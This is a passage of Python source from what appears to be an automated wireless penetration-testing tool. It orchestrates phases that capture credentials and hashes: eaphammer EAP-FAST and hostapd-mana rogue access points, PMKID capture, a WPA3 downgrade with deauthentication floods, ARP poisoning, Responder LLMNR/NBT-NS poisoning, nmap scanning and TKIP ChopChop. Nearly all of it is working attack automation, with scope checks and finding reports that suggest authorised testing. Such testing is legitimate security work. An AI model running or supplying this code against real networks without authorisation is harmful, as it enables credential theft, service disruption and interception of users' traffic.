                         eaphammer_path: str, output_dir: Path,
                         timeout: int) -> None:
    _check_pause()
    status("p8b_eap_fast", "Phase 8b: EAP-FAST Anonymous PAC Provisioning", "running")
    log("[8b] START: EAP-FAST Anonymous PAC Provisioning — testing for unauthenticated PAC acceptance")

    enterprise_aps = [
        ap for ap in target_aps
        if re.search(r"MGT|EAP|Enterprise|802\.1[Xx]",
                     (ap.get("auth") or "") + " " + (ap.get("encryption") or ""), re.I)
    ]
    if not enterprise_aps:
        log("Phase 8b: No WPA-Enterprise APs in scope — skipping EAP-FAST attack.")
        status("p8b_eap_fast", "Phase 8b: EAP-FAST Anonymous PAC Provisioning", "skipped")
        return

    ep_path = Path(eaphammer_path) if Path(eaphammer_path).exists() else Path(
        shutil.which("eaphammer") or "/opt/eaphammer/eaphammer"
    )
    if not ep_path.exists():
        log("Phase 8b: eaphammer not found — skipping EAP-FAST attack.")
        status("p8b_eap_fast", "Phase 8b: EAP-FAST Anonymous PAC Provisioning", "skipped")
        return

    ef_dir = output_dir / "eap_fast_anon"
    ef_dir.mkdir(exist_ok=True)

    for ap in enterprise_aps:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = int(ap.get("channel") or 6)
        log(f"Phase 8b: EAP-FAST anonymous PAC against {ssid!r} [{bssid}]")
        cred_file = ef_dir / f"creds_{bssid.replace(':','')}.txt"
        cmd = [
            str(ep_path), "--interface", monitor_iface,
            "--essid", ssid, "--channel", str(channel),
            "--auth", "wpa-eap",
            "--creds",
            "--negotiate", "manual",
            "--phase-1-methods", "FAST",          # EAP-FAST only
            "--phase-2-methods", "MSCHAPV2",      # inner method
            "--auto-pac",                          # anonymous PAC provisioning
        ]
        if bssid:
            cmd += ["--bssid", bssid]
        try:
            out, rc = _run(cmd, timeout=min(timeout, 180))
            (ef_dir / f"eaphammer_{bssid.replace(':','')}.log").write_text(
                out, encoding="utf-8"
            )
            cred_lines = [l for l in out.splitlines()
                          if re.search(r"username|password|mschapv2|pac|credential", l, re.I)]
            if cred_lines:
                cred_file.write_text("\n".join(cred_lines), encoding="utf-8")
                finding_from_cat(
                    "eap_fast_anon_pac",
                    data={"ssid": ssid, "bssid": bssid,
                          "credentials_raw": "\n".join(cred_lines[:20]),
                          "attack": "EAP-FAST anonymous PAC"},
                    output_file=str(cred_file),
                    title_override=f"EAP-FAST Anonymous PAC: Credentials Captured from {ssid}",
                )
                log(f"Phase 8b: EAP-FAST credentials captured for {ssid!r}")
            else:
                log(f"Phase 8b: No credentials captured from {ssid!r}")
        except Exception as exc:
            err(f"Phase 8b: eaphammer EAP-FAST error for {ssid!r}: {exc}")

    log(f"[8b] END: EAP-FAST Anonymous PAC — tested {len(enterprise_aps)} AP(s)")
    status("p8b_eap_fast", "Phase 8b: EAP-FAST Anonymous PAC Provisioning", "complete")


# ── Phase 6c: MANA Loud Mode (full known-beacon spam) ─────────────────────────
# 2026-06-11 review round 5: distinct from KARMA (phase 6b) which only
# answers probe requests with a single SSID.  MANA loud mode replays
# every known-beacon SSID the station has previously associated with,
# dramatically increasing connect probability for unconfigured clients
# (corporate laptops with Auto-Connect SSID list still populated, etc.).

def phase_mana_loud(monitor_iface: str, primary_iface: str,
                     output_dir: Path, rogue_cfg: dict, timeout: int) -> None:
    _check_pause()
    status("p6c_mana_loud", "Phase 6c: MANA Loud Mode", "running")
    log("[6c] START: MANA Loud Mode — full known-beacon SSID spam")

    if not shutil.which("hostapd-mana"):
        log("Phase 6c: hostapd-mana not installed — skipping MANA loud mode.")
        status("p6c_mana_loud", "Phase 6c: MANA Loud Mode", "skipped")
        return

    mana_dir = output_dir / "mana_loud"
    mana_dir.mkdir(exist_ok=True)
    conf_file = mana_dir / "hostapd_mana.conf"
    log_file  = mana_dir / "hostapd_mana.log"
    creds_file = mana_dir / "captured_creds.txt"

    conf = (
        f"interface={monitor_iface}\n"
        f"driver=nl80211\n"
        f"ssid=__MANA__\n"
        f"hw_mode=g\n"
        f"channel=1\n"
        # MANA loud mode — see hostapd-mana README
        f"mana_wpaout={log_file}\n"
        f"mana_loud=1\n"
        f"mana_macacl=0\n"
        f"mana_eap_success=1\n"
        f"ieee8021x=1\n"
        f"eap_server=1\n"
        f"eap_user_file={mana_dir / 'eap_users'}\n"
    )
    conf_file.write_text(conf, encoding="utf-8")
    (mana_dir / "eap_users").write_text(
        '* PEAP\n"anonymous" MSCHAPV2 "password" [2]\n',
        encoding="utf-8",
    )

    log(f"Phase 6c: starting hostapd-mana on {monitor_iface} (loud mode)")
    proc = None
    try:
        proc = _popen(
            ["sudo", "hostapd-mana", str(conf_file)],
            stdout=open(log_file, "a"),
            stderr=subprocess.STDOUT,
        )
        _pause_sleep(min(timeout, 180))
    except Exception as exc:
        err(f"Phase 6c: hostapd-mana error: {exc}")
    finally:
        if proc is not None:
            _kill_proc(proc)

    if log_file.exists() and log_file.stat().st_size > 0:
        txt = log_file.read_text(encoding="utf-8", errors="replace")
        cred_lines = [l for l in txt.splitlines()
                      if re.search(r"identity|username|mschapv2|hash|password", l, re.I)]
        ssids_seen = sorted(set(
            re.findall(r"PROBE-REQ.*'([^']+)'", txt)
        ))
        if cred_lines:
            creds_file.write_text("\n".join(cred_lines), encoding="utf-8")
            finding_from_cat(
                "mana_loud_creds",
                data={"credentials_raw": "\n".join(cred_lines[:30]),
                      "probed_ssids": ssids_seen[:50],
                      "attack": "MANA loud mode"},
                output_file=str(creds_file),
                title_override="MANA Loud Mode: Credentials Captured from Probing Stations",
            )
            log(f"Phase 6c: MANA captured {len(cred_lines)} credential line(s)")
        elif ssids_seen:
            finding_from_cat(
                "mana_loud_probe_leak",
                data={"probed_ssids": ssids_seen[:50],
                      "attack": "MANA loud mode (probe collection)"},
                output_file=str(log_file),
                title_override=("MANA Loud Mode: Stations Probing for "
                                f"{len(ssids_seen)} Known SSID(s)"),
            )
            log(f"Phase 6c: MANA observed {len(ssids_seen)} probed SSID(s) (no creds)")
        else:
            log("Phase 6c: MANA collected no probes or credentials")

    log("[6c] END: MANA Loud Mode complete")
    status("p6c_mana_loud", "Phase 6c: MANA Loud Mode", "complete")


# ── Phase 1c: PMKID Roam Capture (802.11r FT events) ──────────────────────────
# 2026-06-11 review round 5: complements phase_pmkid (which captures the
# initial association PMKID).  When 802.11r Fast Transition is enabled,
# every roam re-broadcasts a fresh PMKID against the new AP.  Stations
# moving between APs during the timeout window produce additional PMKIDs
# that the original capture misses.  Same toolchain (hcxdumptool +
# hcxpcapngtool), but we run for the full timeout without per-target
# filtering so every BSSID in the ESS is recorded.

def phase_pmkid_roam(monitor_iface: str, target_aps: list,
                      output_dir: Path, timeout: int = 300,
                      wordlist: str | None = None,
                      hashcat_rules: list | None = None) -> None:
    _check_pause()
    if not shutil.which("hcxdumptool") or not shutil.which("hcxpcapngtool"):
        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "skipped",
               "hcxdumptool / hcxpcapngtool not installed")
        return

    scoped_aps = [ap for ap in target_aps if _in_scope(ap)]
    if not scoped_aps:
        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "skipped", "no targets")
        return

    # Group by SSID — roam events happen WITHIN an ESS (same SSID, different BSSIDs)
    ess_groups: dict[str, list[str]] = {}
    for ap in scoped_aps:
        ssid  = ap.get("ssid", "")
        bssid = ap.get("bssid", "")
        if ssid and bssid:
            ess_groups.setdefault(ssid, []).append(bssid)
    # Only ESSs with 2+ BSSIDs can roam
    multi_ap = {k: v for k, v in ess_groups.items() if len(v) > 1}
    if not multi_ap:
        log("Phase 1c: No multi-AP ESSs in scope — roam capture would have no effect.")
        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "skipped",
               "no multi-AP ESSs")
        return

    status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "running")
    log(f"[1c-roam] START: PMKID Roam Capture — {len(multi_ap)} multi-AP ESS(s), timeout={timeout}s")
    roam_dir = output_dir / "pmkid_roam"
    roam_dir.mkdir(parents=True, exist_ok=True)

    # All scoped BSSIDs across all ESSs — capture everything that could roam.
    all_bssids = [b for bssids in multi_ap.values() for b in bssids]
    bssid_filter = roam_dir / "bssids.txt"
    bssid_filter.write_text("\n".join(all_bssids) + "\n", encoding="utf-8")

    pcapng_file = roam_dir / "roam_capture.pcapng"
    cmd = [
        "sudo", "hcxdumptool",
        "-i", monitor_iface,
        "-w", str(pcapng_file),
        "--rds=1",
        f"--filterlist_ap={bssid_filter}",
        "--filtermode=2",
        # Aggressive M1 retransmit to trigger roams + capture FT PMKIDs
        "--rcascan=active",
    ]

    log(f"[1c] hcxdumptool: roam capture ({timeout}s, "
        f"{len(multi_ap)} multi-AP ESS, {len(all_bssids)} BSSID)")
    proc = None
    try:
        proc = _popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        _pause_sleep(timeout)
    except Exception:
        pass
    finally:
        if proc is not None:
            _kill_proc(proc)

    if not pcapng_file.exists() or pcapng_file.stat().st_size == 0:
        log("[1c] hcxdumptool: no roam capture data collected")
        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "complete")
        return

    hc22000_file = roam_dir / "roam_hashes.hc22000"
    conv_out, _ = _run([
        "hcxpcapngtool", "-o", str(hc22000_file), str(pcapng_file),
    ], timeout=60)
    log(conv_out.strip())

    if not hc22000_file.exists() or hc22000_file.stat().st_size == 0:
        log("[1c] hcxpcapngtool: no roam-event PMKIDs extracted")
        status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "complete")
        return

    hash_lines = [l for l in hc22000_file.read_text(encoding="utf-8").splitlines() if l.strip()]
    log(f"[1c] Extracted {len(hash_lines)} roam-event PMKID/EAPOL hash(es)")
    # One finding per (SSID, BSSID) — roam events are per-BSSID
    seen: set[tuple[str, str]] = set()
    for hl in hash_lines:
        parts = hl.split("*")
        if len(parts) >= 4:
            try:
                ssid_from_hash = bytes.fromhex(parts[3]).decode("utf-8", errors="replace")
            except Exception:
                ssid_from_hash = ""
            bssid_hex = parts[1] if len(parts) > 1 else ""
            key = (ssid_from_hash, bssid_hex)
            if ssid_from_hash and key not in seen:
                seen.add(key)
                finding_from_cat(
                    "pmkid_roam_capture",
                    data={"ssid": ssid_from_hash, "bssid_hex": bssid_hex,
                          "ess_aps": multi_ap.get(ssid_from_hash, []),
                          "hash_file": str(hc22000_file)},
                    output_file=str(hc22000_file),
                    title_override=f"PMKID Captured from FT Roam Event: {ssid_from_hash}",
                )

    log("[1c-roam] END: PMKID Roam Capture complete")
    status("p1c_pmkid_roam", "Phase 1c: PMKID Roam Capture", "complete")


# ── Phase 9: SAE Transition Mode Downgrade ────────────────────────────────────

def phase_sae_downgrade(monitor_iface: str, primary_iface: str,
                         target_aps: list, enriched_aps: list,
                         output_dir: Path, rogue_cfg: dict, timeout: int) -> None:
    _check_pause()
    status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "running")
    log("[9] START: SAE Transition Mode Downgrade — testing WPA3/WPA2 dual-mode APs")

    aps = target_aps or enriched_aps
    wpa3_transition = [
        ap for ap in aps
        if re.search(r"SAE|WPA3", (ap.get("encryption") or "") + " " + (ap.get("auth") or ""), re.I)
        and re.search(r"WPA2|PSK", (ap.get("encryption") or "") + " " + (ap.get("auth") or ""), re.I)
    ]
    if not wpa3_transition:
        log("Phase 9: No WPA3/WPA2 transition-mode APs found — skipping.")
        status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "skipped")
        return

    ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
    if not ap_iface:
        ap_iface = _find_ap_interface([monitor_iface, primary_iface])
    if not ap_iface:
        log("Phase 9: No second wireless interface for downgrade AP — skipping.")
        status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "skipped")
        return

    dg_dir = output_dir / "sae_downgrade"
    dg_dir.mkdir(exist_ok=True)

    country = (rogue_cfg.get("country_code") or "US").strip().upper()
    _run(["sudo", "iw", "reg", "set", country], timeout=5)
    time.sleep(1)

    for ap in wpa3_transition:
        ssid       = ap.get("ssid", "")
        bssid      = ap.get("bssid", "")
        channel    = int(ap.get("channel") or 6)
        ap_channel = _select_ap_channel(ap_iface, channel)
        if ap_channel is None:
            log(f"Phase 9: No allowed 5GHz channels on {ap_iface} after reg set {country!r} "
                f"— falling back to 2.4GHz (ch 6)")
            ap_channel = 6
        elif ap_channel != channel:
            log(f"Phase 9: Channel {channel} not available for AP mode on {ap_iface} "
                f"(NO-IR/disabled) — using channel {ap_channel}")
        log(f"Phase 9: WPA2-only rogue AP targeting {ssid!r} [{bssid}] (transition mode)")

        if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
            continue
        ha_conf = _write_hostapd_conf(ssid, "", ap_channel, "OPEN", "", ap_iface, dg_dir, country)
        dm_conf = _write_dnsmasq_conf(ap_iface, dg_dir)

        cap_file = dg_dir / f"sae_dg_{bssid.replace(':','')}.cap"
        airodump_proc = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "-c", str(channel),
             "-w", str(dg_dir / f"sae_dg_{bssid.replace(':','')}"),
             "--output-format", "pcap", monitor_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "--conf-file=" + str(dm_conf), "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        with open(dg_dir / "hostapd_sae.log", "w") as hlog:
            hostapd_proc = subprocess.Popen(
                ["hostapd", str(ha_conf)], stdout=hlog, stderr=hlog,
            )

        duration        = min(timeout, 120)
        deauth_interval = 20
        deauth_count    = 5
        has_aireplay    = shutil.which("aireplay-ng") is not None
        clients         = ap.get("clients", [])

        if has_aireplay:
            log(f"Phase 9: Rogue AP active for {duration}s — "
                f"deauthing {'clients' if clients else 'broadcast'} every {deauth_interval}s")
        else:
            log(f"Phase 9: Rogue AP active for {duration}s — "
                f"passive (aireplay-ng not found)")

        time.sleep(3)  # let rogue AP stabilise before first deauth
        elapsed = 3
        while elapsed < duration:
            if has_aireplay:
                _run(["sudo", "iwconfig", monitor_iface, "channel", str(channel)],
                     timeout=5)
                if clients:
                    for c in clients:
                        mac = c.get("mac", "")
                        if not mac:
                            continue
                        log(f"[9] Deauth ×{deauth_count} → {mac} from {bssid}")
                        _run(["sudo", "aireplay-ng",
                              "-0", str(deauth_count),
                              "-a", bssid, "-c", mac,
                              monitor_iface],
                             timeout=deauth_count * 2 + 10)
                else:
                    log(f"[9] Broadcast deauth ×{deauth_count} → {bssid}")
                    _run(["sudo", "aireplay-ng",
                          "-0", str(deauth_count),
                          "-a", bssid,
                          monitor_iface],
                         timeout=deauth_count * 2 + 10)
            sleep_for = min(deauth_interval, duration - elapsed)
            if sleep_for > 0:
                _pause_sleep(sleep_for)
            elapsed += deauth_interval

        for proc in (hostapd_proc, dnsmasq_proc, airodump_proc):
            _kill_proc(proc)
        subprocess.run(["ip", "addr", "flush", "dev", ap_iface],
                       check=False, capture_output=True)

        # Look for captured handshakes
        caps = list(dg_dir.glob(f"sae_dg_{bssid.replace(':','')}*.cap"))
        handshake_found = False
        if caps and shutil.which("aircrack-ng"):
            for cap in caps:
                chk, _ = _run(["aircrack-ng", "-a", "2", str(cap)], timeout=30)
                if re.search(r"1 handshake", chk, re.I):
                    handshake_found = True
                    break

        result = {
            "ssid": ssid, "bssid": bssid,
            "downgrade_attempted": True,
            "handshake_captured": handshake_found,
        }
        (dg_dir / "sae_downgrade_results.json").write_text(
            json.dumps(result, indent=2), encoding="utf-8"
        )
        if handshake_found:
            finding_from_cat(
                "sae_transition_downgrade",
                data=result,
                output_file=str(dg_dir / "sae_downgrade_results.json"),
                title_override=f"WPA3 SAE Transition Mode Downgrade: {ssid}",
            )
        log(f"Phase 9: {ssid!r} — handshake {'captured' if handshake_found else 'not captured'}")

    log(f"[9] END: SAE Transition Mode Downgrade — tested {len(wpa3_transition)} AP(s)")
    status("p9_sae_downgrade", "Phase 9: SAE Transition Mode Downgrade", "complete")


# ── Phase 10: Post-Connection Attacks ─────────────────────────────────────────

def _get_ap_dhcp_clients(ap_iface: str) -> list:
    clients = []
    for lease_path in [Path("/var/lib/misc/dnsmasq.leases"),
                        Path("/var/lib/dnsmasq/dnsmasq.leases")]:
        if lease_path.exists():
            try:
                for line in lease_path.read_text().splitlines():
                    parts = line.split()
                    if len(parts) >= 3:
                        clients.append({"mac": parts[1], "ip": parts[2]})
            except Exception:
                pass
    if not clients and shutil.which("arp"):
        out, _ = _run(["arp", "-i", ap_iface, "-n"], timeout=10)
        for line in out.splitlines()[1:]:
            parts = line.split()
            if len(parts) >= 3 and parts[2] != "<incomplete>":
                clients.append({"ip": parts[0], "mac": parts[2]})
    return clients


def _detect_local_range(ap_iface: str) -> str:
    try:
        out, _ = _run(["ip", "addr", "show", ap_iface], timeout=5)
        m = re.search(r"inet\s+([\d.]+/\d+)", out)
        if m:
            net = ipaddress.IPv4Interface(m.group(1)).network
            return str(net)
    except Exception:
        pass
    return _CAPTIVE_CIDR


def _iface_connection_state(iface: str) -> "tuple[bool, str, str]":
    """Confirm `iface` is actually on a network before post-connection attacks
    run.  Returns (connected, ip, ssid).

    `connected` is True only when the interface carries an IPv4 address — the
    interface is either associated as a station (DHCP-leased) or hosting the
    rogue AP (assigned _CAPTIVE_IP).  No IPv4 means the radio isn't on any
    network, so ARP poisoning / Responder / internal nmap would fire into the
    void.  `ssid` is the associated ESSID when the interface is a station
    (parsed from `iw dev <iface> link`), or "" in AP mode / when unavailable."""
    ip = _get_iface_ip(iface) or ""
    ssid = ""
    try:
        out, rc = _run(["iw", "dev", iface, "link"], timeout=5)
        if rc == 0 and out:
            m = re.search(r"SSID:\s*(.+)", out)
            if m:
                ssid = m.group(1).strip()
    except Exception:
        pass
    return (bool(ip), ip, ssid)


def phase_post_connection(ap_iface: str, output_dir: Path,
                           post_cfg: dict, timeout: int) -> None:
    _check_pause()
    status("p10_post", "Phase 10: Post-Connection Attacks", "running")
    log("[10] START: Post-Connection Attacks — ARP poisoning, LLMNR/NBT-NS, internal scanning")

    if not ap_iface:
        log("Phase 10: No AP interface configured — skipping post-connection attacks.")
        status("p10_post", "Phase 10: Post-Connection Attacks", "skipped")
        return

    connected, iface_ip, assoc_ssid = _iface_connection_state(ap_iface)
    if not connected:
        log(f"Phase 10: {ap_iface} has no IPv4 address — interface is not "
            f"associated/connected to any network. Skipping post-connection "
            f"attacks (nothing to attack).")
        status("p10_post", "Phase 10: Post-Connection Attacks", "skipped")
        return
    log(f"Phase 10: Connection confirmed on {ap_iface} (ip={iface_ip}"
        + (f", ssid={assoc_ssid!r}" if assoc_ssid else "") + ")")

    pc_dir = output_dir / "post_connection"
    pc_dir.mkdir(exist_ok=True)

    network_range = post_cfg.get("scan_range") or _detect_local_range(ap_iface)
    duration      = int(post_cfg.get("duration", 120))
    clients       = _get_ap_dhcp_clients(ap_iface)
    log(f"Phase 10: Interface={ap_iface}  Network={network_range}  "
        f"Clients={len(clients)}")

    # ── 10a: ARP Poisoning / MITM ─────────────────────────────────────────────
    if post_cfg.get("arp_poison", True):
        status("p10_arp", "Phase 10a: ARP Poisoning / MITM", "running")
        arpspoof = shutil.which("arpspoof")
        bettercap = shutil.which("bettercap")
        arp_results = {"targets": [], "tool": None}

        if arpspoof and clients:
            subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
                           check=False, capture_output=True)
            gateway = _CAPTIVE_IP
            procs = []
            for cl in clients[:5]:  # limit to 5 targets
                target_ip = cl.get("ip", "")
                if not target_ip or target_ip == gateway:
                    continue
                log(f"Phase 10a: ARP poisoning {target_ip} ↔ {gateway}")
                p1 = subprocess.Popen(
                    ["arpspoof", "-i", ap_iface, "-t", target_ip, gateway],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                p2 = subprocess.Popen(
                    ["arpspoof", "-i", ap_iface, "-t", gateway, target_ip],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                procs.extend([p1, p2])
                arp_results["targets"].append(target_ip)
            arp_results["tool"] = "arpspoof"
            _pause_sleep(min(duration // 2, 60))
            for p in procs:
                _kill_proc(p)
        elif bettercap and clients:
            log("Phase 10a: ARP poisoning via bettercap")
            bc_script = pc_dir / "arp.cap"
            targets_str = ",".join(c.get("ip", "") for c in clients[:5] if c.get("ip"))
            bc_script.write_text(
                f"set arp.spoof.targets {targets_str}\n"
                "arp.spoof on\n"
                f"sleep {min(duration//2, 60)}\n"
                "arp.spoof off\n"
                "quit\n",
                encoding="utf-8",
            )
            out, _ = _run(
                ["bettercap", "-iface", ap_iface, "-caplet", str(bc_script)],
                timeout=min(duration // 2, 70),
            )
            (pc_dir / "bettercap_arp.log").write_text(out, encoding="utf-8")
            arp_results["tool"] = "bettercap"
        else:
            log("Phase 10a: arpspoof/bettercap not found or no clients — skipping ARP poison.")

        (pc_dir / "arp_results.json").write_text(
            json.dumps(arp_results, indent=2), encoding="utf-8"
        )
        if arp_results["targets"]:
            finding_from_cat(
                "arp_poison",
                data=arp_results,
                output_file=str(pc_dir / "arp_results.json"),
                title_override=f"ARP Poisoning MITM: {len(arp_results['targets'])} Target(s) Poisoned",
            )
        status("p10_arp", "Phase 10a: ARP Poisoning / MITM", "complete")

    # ── 10b: LLMNR / NBT-NS / mDNS Poisoning ─────────────────────────────────
    if post_cfg.get("llmnr_poison", True) and not clients:
        log("Phase 10b: No connected clients — skipping LLMNR/NBT-NS poisoning.")
    elif post_cfg.get("llmnr_poison", True):
        status("p10_llmnr", "Phase 10b: LLMNR / NBT-NS Poisoning", "running")
        responder_bin = (
            shutil.which("responder") or
            shutil.which("Responder") or
            "/opt/Responder/Responder.py"
        )
        responder_path = Path(responder_bin) if responder_bin else None

        if responder_path and responder_path.exists():
            log(f"Phase 10b: Responder on {ap_iface} for {min(duration, 90)}s")
            resp_log = pc_dir / "responder.log"
            cmd = (["python3", str(responder_path)]
                   if responder_path.suffix == ".py"
                   else [str(responder_path)])
            cmd += ["-I", ap_iface, "-w", "-d", "-f", "--lm"]
            try:
                with open(resp_log, "w") as rlog:
                    proc = subprocess.Popen(cmd, stdout=rlog, stderr=rlog)
                _pause_sleep(min(duration, 90))
                _kill_proc(proc)
                raw = resp_log.read_text(encoding="utf-8", errors="replace")
                hashes = re.findall(
                    r"(NTLMv[12]|LM|NTHash)[^\n]*\n([^\n]+)", raw
                )
                responder_dir = Path("/usr/share/responder/logs")
                if not responder_dir.exists():
                    responder_dir = Path("/opt/Responder/logs")
                captured_hashes = []
                if responder_dir.exists():
                    for hf in sorted(responder_dir.glob("*.txt"))[-5:]:
                        try:
                            content = hf.read_text(encoding="utf-8", errors="replace")
                            if content.strip():
                                captured_hashes.append({
                                    "file": str(hf), "content": content[:500]
                                })
                                (pc_dir / hf.name).write_text(content, encoding="utf-8")
                        except Exception:
                            pass
                if captured_hashes or hashes:
                    finding_from_cat(
                        "llmnr_hashes",
                        data={"hashes_captured": len(captured_hashes),
                              "interface": ap_iface},
                        output_file=str(resp_log),
                        title_override="LLMNR/NBT-NS Credential Hashes Captured",
                    )
                    log(f"Phase 10b: {len(captured_hashes)} hash file(s) captured")
                else:
                    log("Phase 10b: Responder ran — no hashes captured.")
            except Exception as exc:
                err(f"Phase 10b: Responder error: {exc}")
        else:
            log("Phase 10b: Responder not found — skipping LLMNR poisoning.")
        status("p10_llmnr", "Phase 10b: LLMNR / NBT-NS Poisoning", "complete")

    # ── 10c: Internal Network Port Scan ───────────────────────────────────────
    if post_cfg.get("port_scan", True) and not clients:
        log("Phase 10c: No connected clients — skipping internal network port scan.")
    elif post_cfg.get("port_scan", True):
        status("p10_portscan", "Phase 10c: Internal Network Port Scan", "running")
        if not shutil.which("nmap"):
            log("Phase 10c: nmap not installed — skipping port scan.")
        else:
            log(f"Phase 10c: Scanning {network_range} with nmap")
            scan_dir = pc_dir / "nmap"
            scan_dir.mkdir(exist_ok=True)
            out_base = str(scan_dir / "scan")
            out, rc  = _run(
                ["nmap", "-sV", "--open", "-T4", "-O",
                 "-oA", out_base, network_range],
                timeout=min(timeout, 300),
            )
            (scan_dir / "nmap.log").write_text(out, encoding="utf-8")
            # Parse for interesting hosts
            hosts = re.findall(
                r"Nmap scan report for ([\d.]+)\n(.*?)(?=Nmap scan report|\Z)",
                out, re.S,
            )
            interesting = []
            for host_ip, host_body in hosts:
                open_ports = re.findall(r"(\d+/(?:tcp|udp)\s+open\s+\S+)", host_body)
                if open_ports:
                    interesting.append({"ip": host_ip, "ports": open_ports})
            if interesting:
                (scan_dir / "interesting_hosts.json").write_text(
                    json.dumps(interesting, indent=2), encoding="utf-8"
                )
                finding_from_cat(
                    "internal_hosts",
                    data={"network": network_range, "hosts": interesting},
                    output_file=str(scan_dir / "interesting_hosts.json"),
                    title_override=f"Internal Network Hosts Discovered: {len(interesting)} Target(s)",
                )
                log(f"Phase 10c: {len(interesting)} host(s) with open ports found")
            else:
                log("Phase 10c: No hosts with open ports found.")
        status("p10_portscan", "Phase 10c: Internal Network Port Scan", "complete")

    log("[10] END: Post-Connection Attacks complete")
    status("p10_post", "Phase 10: Post-Connection Attacks", "complete")


# ── Phase 11: Legacy / Niche Attacks ─────────────────────────────────────────

def phase_legacy_attacks(monitor_iface: str, target_aps: list,
                          enriched_aps: list, output_dir: Path,
                          tools: dict, timeout: int,
                          managed_iface: str = "") -> None:
    """managed_iface is the in-managed-mode wireless interface
    (e.g. wlan0) used to source captive portal bypass test traffic.  When
    empty or unavailable, captive portal tests skip with a clear log
    rather than emitting false positives via whatever route the OS picks."""
    _check_pause()
    status("p11_legacy", "Phase 11: Legacy / Niche Attacks", "running")
    aps    = target_aps or enriched_aps
    log(f"[11] START: Legacy / Niche Attacks — {len(aps)} AP(s)")
    lg_dir = output_dir / "legacy_attacks"
    lg_dir.mkdir(exist_ok=True)

    # ── 11a: TKIP ChopChop / Fragmentation ────────────────────────────────────
    status("p11_tkip", "Phase 11a: TKIP ChopChop / Fragmentation", "running")
    tkip_aps = [
        ap for ap in aps
        if re.search(r"\bTKIP\b", ap.get("cipher") or ap.get("encryption") or "", re.I)
    ]
    if tkip_aps:
        tkip_dir = lg_dir / "tkip"
        tkip_dir.mkdir(exist_ok=True)
        for ap in tkip_aps:
            bssid   = ap.get("bssid", "")
            ssid    = ap.get("ssid", "")
            clients = ap.get("clients") or []
            client_mac = clients[0]["mac"] if clients else "FF:FF:FF:FF:FF:FF"
            log(f"Phase 11a: TKIP detected on {ssid!r} [{bssid}] — attempting ChopChop")
            finding_from_cat(
                "tkip_detected",
                data={"ssid": ssid, "bssid": bssid},
                output_file=str(tkip_dir / "tkip_findings.json"),
                title_override=f"TKIP Cipher in Use (Deprecated): {ssid}",
            )
            # Attempt ChopChop with auto-accept first packet
            try:
                proc = subprocess.Popen(
                    ["aireplay-ng", "--chopchop", "-b", bssid,
                     "-h", client_mac, "-D", monitor_iface],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                )
                out_bytes, _ = proc.communicate(input=b"y\n", timeout=min(timeout, 60))
                out_text = out_bytes.decode("utf-8", errors="replace")
                (tkip_dir / f"chopchop_{bssid.replace(':','')}.txt").write_text(
                    out_text, encoding="utf-8"
                )
                if re.search(r"Saving chosen packet|\.xor", out_text, re.I):
                    log(f"Phase 11a: ChopChop XOR keystream obtained for {ssid!r}")
                    finding_from_cat(
                        "tkip_chopchop",
                        data={"ssid": ssid, "bssid": bssid},
                        output_file=str(tkip_dir / f"chopchop_{bssid.replace(':','')}.txt"),
                        title_override=f"TKIP ChopChop XOR Keystream Extracted: {ssid}",
                    )
                else:
                    log(f"Phase 11a: ChopChop did not produce keystream for {ssid!r}")
            except subprocess.TimeoutExpired:
                log(f"Phase 11a: ChopChop timed out for {ssid!r}")
            except Exception as exc:
                err(f"Phase 11a: ChopChop error: {exc}")
    else:
        log("Phase 11a: No TKIP-cipher APs found — skipping TKIP attacks.")
    status("p11_tkip", "Phase 11a: TKIP ChopChop / Fragmentation", "complete")

    # ── 11b: Wi-Fi Direct / P2P WPS ──────────────────────────────────────────
    status("p11_wifidirect", "Phase 11b: Wi-Fi Direct / P2P WPS Scanning", "running")
    p2p_dir = lg_dir / "wifidirect"
    p2p_dir.mkdir(exist_ok=True)
    p2p_devices = []

    # Scan with wash for WPS devices
    if shutil.which("wash"):
        log("Phase 11b: Scanning for WPS/P2P devices with wash")
        out, rc = _run(["wash", "-i", monitor_iface, "-s", "-j"], timeout=min(timeout, 60))
        (p2p_dir / "wash_output.txt").write_text(out, encoding="utf-8")
        for line in out.splitlines():
            m = re.search(
                r"((?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+.*?\s+(\d+)\s+.*?(DIRECT-\S+|\S+)",
                line
            )
            if m or "DIRECT-" in line:
                bssid_m = re.search(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})", line)
                ssid_m  = re.search(r"(DIRECT-\S+)", line)
                chan_m  = re.search(r"\b(\d{1,3})\b", line)
                if bssid_m:
                    p2p_devices.append({
                        "bssid": bssid_m.group(1),
                        "ssid":  ssid_m.group(1) if ssid_m else "",
                        "channel": int(chan_m.group(1)) if chan_m else 0,
                    })

    # Also scan iw for P2P-capable devices
    if shutil.which("iw"):
        out, _ = _run(["iw", "dev", monitor_iface, "scan"], timeout=30)
        for block in re.split(r"(?=BSS [0-9a-f:]{17})", out):
            if "P2P" not in block and "DIRECT-" not in block:
                continue
            bssid_m = re.search(r"BSS\s+([0-9a-f:]{17})", block)
            ssid_m  = re.search(r'SSID:\s+(DIRECT-\S+)', block)
